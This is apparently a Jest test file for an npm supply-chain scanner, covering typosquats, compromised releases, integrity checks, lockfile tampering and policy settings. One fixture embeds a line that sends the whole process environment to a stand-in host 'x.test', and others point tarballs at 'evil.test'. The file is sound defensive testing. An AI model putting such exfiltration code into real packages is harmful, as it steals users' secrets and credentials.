import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { execFileSync } from 'child_process';
import {
    assessPackage,
    DEFAULT_POLICY,
    diffLockfiles,
    formatAssessment,
    formatReviewMarkdown,
    loadSupplyChainPolicy,
    normalizePolicy,
    parsePackageSpec,
    policyFromConfigText,
    previousVersion,
    resolveVersion,
    reviewDependencyChange,
    reviewLockfiles,
    SupplyChainPolicy,
    verdictFor,
} from '../src/supply-chain';
import { createRegistryClient } from '../src/supply-chain/registry';
import { fakeRegistry, integrity, lockfile, tarball } from './helpers/npm-fixtures';

const now = new Date('2026-11-18T12:00:00.000Z');
const policy: SupplyChainPolicy = { ...DEFAULT_POLICY };
const ids = (a: { signals: Array<{ id: string }> }) => a.signals.map((s) => s.id).sort();

describe('assessPackage', () => {
    it('blocks names that do not exist and suggests the intended package', async () => {
        const result = await assessPackage('lodahs', undefined, {
            policy,
            client: fakeRegistry({}),
            now,
        });
        expect(result.verdict).toBe('block');
        expect(result.signals[0]).toMatchObject({ id: 'nonexistent', severity: 'critical' });
        expect(result.signals[0].message).toContain('Did you mean lodash?');
        expect(formatAssessment(result)).toContain('BLOCK lodahs@latest');
    });

    it('allows an established release whose code did not gain new capabilities', async () => {
        const client = fakeRegistry({
            leftish: {
                '1.0.0': {},
                '1.1.0': { files: { 'index.js': 'module.exports = 2;' }, provenance: true },
            },
        });
        const result = await assessPackage('leftish', '^1.0.0', { policy, client, now });
        expect(result).toMatchObject({
            version: '1.1.0',
            comparedWith: '1.0.0',
            verdict: 'allow',
            provenance: true,
        });
        expect(result.diff).toMatchObject({ filesChanged: 2, filesAdded: 0 });
    });

    it('blocks a compromised release: fresh, provenance dropped, new publisher, exfiltration', async () => {
        const client = fakeRegistry({
            colorful: {
                '5.6.0': { provenance: true, publisher: 'sindre' },
                '5.6.1': {
                    publishedAt: '2026-11-18T10:00:00.000Z',
                    publisher: 'attacker',
                    files: {
                        'index.js':
                            "module.exports = 1; const h = require('https'); h.request('https://x.test', {body: JSON.stringify(process.env)})",
                    },
                },
            },
        });
        const result = await assessPackage('colorful', undefined, { policy, client, now });
        expect(result.verdict).toBe('block');
        expect(ids(result)).toEqual(
            [
                'env-harvest',
                'exfiltration-pattern',
                'fresh-release',
                'network',
                'new-publisher',
                'provenance-dropped',
            ].sort()
        );
        expect(result.signals[0].severity).toBe('critical');
        expect(result.ageHours).toBeCloseTo(2);
    });

    it('flags added install scripts from registry metadata and hidden tarball scripts', async () => {
        const client = fakeRegistry({
            pkg: { '1.0.0': {}, '1.0.1': { scripts: { postinstall: 'node x.js' } } },
        });
        expect(ids(await assessPackage('pkg', '1.0.1', { policy, client, now }))).toContain(
            'install-script-added'
        );
        // Metadata claims no scripts, but the tarball's package.json has one.
        const hidden = fakeRegistry({
            pkg: { '1.0.0': {}, '1.0.1': { scripts: { postinstall: 'node x.js' } } },
        });
        const doc = await hidden.packument('pkg');
        delete doc.versions['1.0.1'].scripts;
        const result = await assessPackage('pkg', '1.0.1', { policy, client: hidden, now });
        expect(result.signals[0]).toMatchObject({ id: 'manifest-mismatch', severity: 'critical' });
    });

    it('weighs publisher changes by release recency', async () => {
        const client = fakeRegistry({
            old: {
                '1.0.0': { publisher: 'a', publishedAt: '2023-01-01T00:00:00.000Z' },
                '1.0.1': { publisher: 'b' },
            },
            hot: {
                '1.0.0': { publisher: 'a' },
                '1.0.1': { publisher: 'b', publishedAt: '2026-11-10T00:00:00.000Z' },
            },
        });
        const old = await assessPackage('old', undefined, { policy, client, now });
        expect(old.signals).toEqual([
            expect.objectContaining({ id: 'new-publisher', severity: 'low' }),
        ]);
        expect(old.verdict).toBe('allow');
        const hot = await assessPackage('hot', undefined, { policy, client, now });
        expect(hot).toMatchObject({
            verdict: 'warn',
            signals: [expect.objectContaining({ severity: 'medium' })],
        });
    });

    it('applies typosquat download thresholds, allowlists, and policy severity', async () => {
        const client = fakeRegistry(
            { expresss: { '1.0.0': {} }, yamljs: { '1.0.0': {} } },
            { expresss: 12, yamljs: 2e6 }
        );
        expect((await assessPackage('expresss', undefined, { policy, client, now })).verdict).toBe(
            'block'
        );
        expect((await assessPackage('yamljs', undefined, { policy, client, now })).signals).toEqual(
            []
        );
        const allowed = await assessPackage('expresss', undefined, {
            policy: { ...policy, allow: ['expresss@1.0.0'] },
            client,
            now,
        });
        expect(allowed).toMatchObject({ verdict: 'allow', allowlisted: true });
        const lenient = await assessPackage('expresss', undefined, {
            policy: { ...policy, blockAt: 'critical' },
            client,
            now,
        });
        expect(lenient.verdict).toBe('warn');
    });

    it('downgrades first-release capabilities and reports new packages and deprecations', async () => {
        const client = fakeRegistry(
            {
                fresh: {
                    '0.1.0': {
                        files: { 'a.js': "require('child_process')" },
                        deprecated: 'use other',
                    },
                },
            },
            {},
            { fresh: '2026-11-15T00:00:00.000Z' }
        );
        const result = await assessPackage('fresh', undefined, { policy, client, now });
        expect(result.signals.find((s) => s.id === 'process-spawn')?.severity).toBe('low');
        expect(ids(result)).toEqual(['deprecated', 'new-package', 'process-spawn']);
        expect(result.verdict).toBe('warn');
    });

    it('records integrity failures, registry errors, and unknown versions', async () => {
        const client = fakeRegistry({ pkg: { '1.0.0': {}, '1.0.1': {} } });
        const doc = await client.packument('pkg');
        doc.versions['1.0.1'].dist.integrity = integrity(Buffer.from('other'));
        const tampered = await assessPackage('pkg', '1.0.1', { policy, client, now });
        expect(tampered.signals[0].id).toBe('integrity-failure');
        const mismatch = await assessPackage('pkg', '1.0.0', {
            policy,
            client,
            now,
            expectedIntegrity: 'sha512-nope',
        });
        expect(mismatch.signals[0].id).toBe('lockfile-integrity-mismatch');
        expect((await assessPackage('pkg', '9.9.9', { policy, client, now })).signals[0].id).toBe(
            'unknown-version'
        );
        expect((await assessPackage('Bad Name', undefined, { policy, client, now })).verdict).toBe(
            'block'
        );
        const broken = { ...client, packument: () => Promise.reject(new Error('offline')) };
        const offline = await assessPackage('pkg', undefined, { policy, client: broken, now });
        expect(offline).toMatchObject({ verdict: 'allow', errors: ['offline'] });
        const noDiff = await assessPackage('pkg', '1.0.0', {
            policy: { ...policy, diff: false },
            client,
            now,
        });
        expect(noDiff.diff).toBeUndefined();
        const missing = { ...client, tarball: () => Promise.reject(new Error('timeout')) };
        expect(
            (await assessPackage('pkg', '1.0.0', { policy, client: missing, now })).errors[0]
        ).toContain('timeout');
    });
});

describe('versions and specs', () => {
    it('resolves tags, ranges, and previous releases', async () => {
        const doc = await fakeRegistry({
            p: { '1.0.0': {}, '1.2.0': {}, '2.0.0-beta.1': {}, '1.3.0': {} },
        }).packument('p');
        expect(resolveVersion(doc)).toBe('1.3.0');
        expect(resolveVersion(doc, '~1.2')).toBe('1.2.0');
        expect(resolveVersion(doc, 'nope@@')).toBeUndefined();
        expect(previousVersion(doc, '1.3.0')).toBe('1.2.0');
        expect(previousVersion(doc, '1.0.0')).toBeUndefined();
        expect(parsePackageSpec('@scope/pkg@^1')).toEqual({ name: '@scope/pkg', range: '^1' });
        expect(parsePackageSpec('pkg')).toEqual({ name: 'pkg' });
    });
});

describe('registry client', () => {
    const response = (body: Buffer | string, status = 200) =>
        new Response(typeof body === 'string' ? body : new Uint8Array(body), {
            status,
            headers: { 'content-length': String(Buffer.byteLength(body)) },
        });

    it('fetches packuments once, refuses foreign tarball hosts, and verifies integrity', async () => {
        const data = tarball({ 'package.json': '{"name":"p","version":"1.0.0"}' });
        const fetcher = jest.fn(async (url: string | URL | Request) => {
            const target = String(url);
            if (target.includes('downloads')) return response('{"downloads":5}');
            if (target.endsWith('/p')) return response(JSON.stringify({ name: 'p', versions: {} }));
            if (target.endsWith('/missing')) return response('', 404);
            if (target.includes('downloads')) return response('{"downloads":5}');
            if (target.endsWith('.tgz')) return response(data);
            return response('', 500);
        }) as unknown as typeof fetch;
        const client = createRegistryClient(undefined, 1000, fetcher);
        await client.packument('p');
        await client.packument('p');
        expect(fetcher).toHaveBeenCalledTimes(1);
        await expect(client.packument('missing')).rejects.toThrow('does not exist');
        await expect(client.packument('../etc')).rejects.toThrow('Invalid package name');
        await expect(client.packument('broken')).rejects.toThrow('500');
        expect(await client.weeklyDownloads('p')).toBe(5);
        const version = {
            name: 'p',
            version: '1.0.0',
            dist: {
                tarball: 'https://registry.npmjs.org/p/-/p-1.0.0.tgz',
                integrity: integrity(data),
            },
        };
        expect((await client.tarball(version)).has('package.json')).toBe(true);
        await expect(
            client.tarball({
                ...version,
                dist: { ...version.dist, tarball: 'https://evil.test/p.tgz' },
            })
        ).rejects.toThrow('Refusing');
        await expect(
            client.tarball({ ...version, dist: { ...version.dist, integrity: 'sha512-x' } })
        ).rejects.toThrow('integrity');
        await expect(
            client.tarball({ ...version, dist: { tarball: version.dist.tarball } })
        ).rejects.toThrow('no integrity');
    });
});

describe('lockfile review', () => {
    it('classifies added, updated, removed packages and lockfile tampering', () => {
        const base = lockfile({
            'node_modules/a': { version: '1.0.0' },
            'node_modules/b': { version: '1.0.0' },
            'node_modules/gone': { version: '1.0.0' },
        });
        const head = lockfile({
            'node_modules/a': { version: '1.1.0' },
            'node_modules/b': { version: '1.0.0', integrity: 'sha512-swapped' },
            'node_modules/c': { version: '2.0.0', resolved: 'https://evil.test/c.tgz' },
            'node_modules/d': { version: '1.0.0', integrity: undefined },
            'node_modules/x/node_modules/a': { version: '1.1.0' },
        });
        const change = diffLockfiles(base, head);
        expect(change.updated.map((u) => `${u.from.version}->${u.to.version}`)).toEqual([
            '1.0.0->1.1.0',
        ]);
        expect(change.added.map((e) => e.name)).toEqual(['c', 'd']);
        expect(change.removed.map((e) => e.name)).toEqual(['gone']);
        expect(change.signals.map((s) => s.id).sort()).toEqual([
            'integrity-changed',
            'missing-integrity',
            'off-registry-source',
        ]);
        expect(() => diffLockfiles({ lockfileVersion: 1 }, head)).toThrow('v2/v3');
    });

    it('passes clean changes, fails blocked releases, and is incomplete on missing evidence', async () => {
        const client = fakeRegistry({
            a: { '1.0.0': {}, '1.1.0': {} },
            bad: { '1.0.0': { publishedAt: '2026-11-18T11:00:00.000Z' } },
        });
        const base = lockfile({ 'node_modules/a': { version: '1.0.0' } }, client);
        const clean = lockfile({ 'node_modules/a': { version: '1.1.0' } }, client);
        const passed = await reviewLockfiles(base, clean, { policy, client, now });
        expect(passed).toMatchObject({
            status: 'passed',
            exitCode: 0,
            summary: { updated: 1, reviewed: 1 },
        });

        const risky = lockfile(
            { 'node_modules/a': { version: '1.0.0' }, 'node_modules/bad': { version: '1.0.0' } },
            client
        );
        const failed = await reviewLockfiles(base, risky, { policy, client, now });
        expect(failed).toMatchObject({ status: 'failed', exitCode: 2, summary: { blocked: 1 } });
        expect(formatReviewMarkdown(failed)).toContain('Flagged releases');
        expect(failed.reasons.join(' ')).toContain('bad@1.0.0');

        const offline = { ...client, tarball: () => Promise.reject(new Error('timeout')) };
        expect((await reviewLockfiles(base, clean, { policy, client: offline, now })).status).toBe(
            'incomplete'
        );
        const both = lockfile(
            { 'node_modules/a': { version: '1.1.0' }, 'node_modules/bad': { version: '1.0.0' } },
            client
        );
        const capped = await reviewLockfiles(base, both, {
            policy: { ...policy, maxPackages: 1, minReleaseAgeHours: 0 },
            client,
            now,
        });
        expect(capped.reasons.join(' ')).toContain('maxPackages');
        const tampered = lockfile({
            'node_modules/a': { version: '1.0.0', integrity: 'sha512-other' },
        });
        const lockFailed = await reviewLockfiles(base, tampered, { policy, client, now });
        expect(lockFailed.status).toBe('failed');
        expect(formatReviewMarkdown(lockFailed)).toContain('Lockfile signals');
    });

    it('reviews Git revisions using the base revision policy, not the candidate', async () => {
        const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'warden review '));
        const git = (...args: string[]) =>
            execFileSync('git', args, { cwd: repo, encoding: 'utf8' }).trim();
        try {
            git('init', '--quiet');
            git('config', 'user.email', 'f@example.com');
            git('config', 'user.name', 'F');
            const base = lockfile({});
            fs.writeFileSync(path.join(repo, 'package-lock.json'), JSON.stringify(base));
            git('add', '.');
            git('commit', '--quiet', '-m', 'base');
            const client = fakeRegistry({
                bad: { '1.0.0': { publishedAt: '2026-11-18T11:00:00.000Z' } },
            });
            const head = lockfile({ 'node_modules/bad': { version: '1.0.0' } }, client);
            fs.writeFileSync(path.join(repo, 'package-lock.json'), JSON.stringify(head));
            fs.writeFileSync(
                path.join(repo, '.wardenrc.json'),
                JSON.stringify({ supplyChain: { allow: ['bad'] } })
            );
            git('add', '.');
            git('commit', '--quiet', '-m', 'head');
            const review = await reviewDependencyChange({
                repository: repo,
                base: 'HEAD~1',
                head: 'HEAD',
                client,
                now,
            });
            expect(review.status).toBe('failed');
            expect(review.revisions?.head.lockfileSha256).toMatch(/^[a-f0-9]{64}$/);
            const lenient = await reviewDependencyChange({
                repository: repo,
                base: 'HEAD~1',
                head: 'HEAD',
                client,
                now,
                overrides: { minReleaseAgeHours: 0 },
            });
            expect(lenient.status).toBe('passed');
            await expect(
                reviewDependencyChange({
                    repository: repo,
                    base: 'HEAD~1',
                    head: 'HEAD',
                    lockfile: '../x',
                    client,
                })
            ).rejects.toThrow('repository-relative');
        } finally {
            fs.rmSync(repo, { recursive: true, force: true });
        }
    });
});

describe('policy', () => {
    it('validates configuration and reads the nearest config file', () => {
        expect(normalizePolicy({ blockAt: 'medium', allow: ['x'], diff: false }).blockAt).toBe(
            'medium'
        );
        expect(() => normalizePolicy({ blockAt: 'severe' })).toThrow('blockAt');
        expect(() => normalizePolicy({ minReleaseAgeHours: -1 })).toThrow('minReleaseAgeHours');
        expect(() => normalizePolicy({ allow: 'x' })).toThrow('allow');
        expect(() => normalizePolicy({ registry: 'http://insecure' })).toThrow('https');
        expect(() => normalizePolicy({ diff: 'yes' })).toThrow('boolean');
        expect(normalizePolicy({ registry: 'https://r.test/' }).registry).toBe('https://r.test');
        expect(policyFromConfigText(undefined)).toEqual(DEFAULT_POLICY);
        expect(
            policyFromConfigText('{"supplyChain":{"minReleaseAgeHours":72}}').minReleaseAgeHours
        ).toBe(72);
        const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'warden-policy-'));
        try {
            fs.writeFileSync(
                path.join(dir, '.wardenrc.json'),
                '{"supplyChain":{"blockAt":"critical"}}'
            );
            expect(loadSupplyChainPolicy(dir, { minReleaseAgeHours: 1 })).toMatchObject({
                blockAt: 'critical',
                minReleaseAgeHours: 1,
            });
            fs.writeFileSync(path.join(dir, '.wardenrc.json'), '{bad');
            expect(() => loadSupplyChainPolicy(dir)).toThrow('Cannot read');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
        expect(verdictFor([], policy)).toBe('allow');
        expect(verdictFor([{ id: 'x', severity: 'low', message: '' }], policy)).toBe('allow');
    });
});
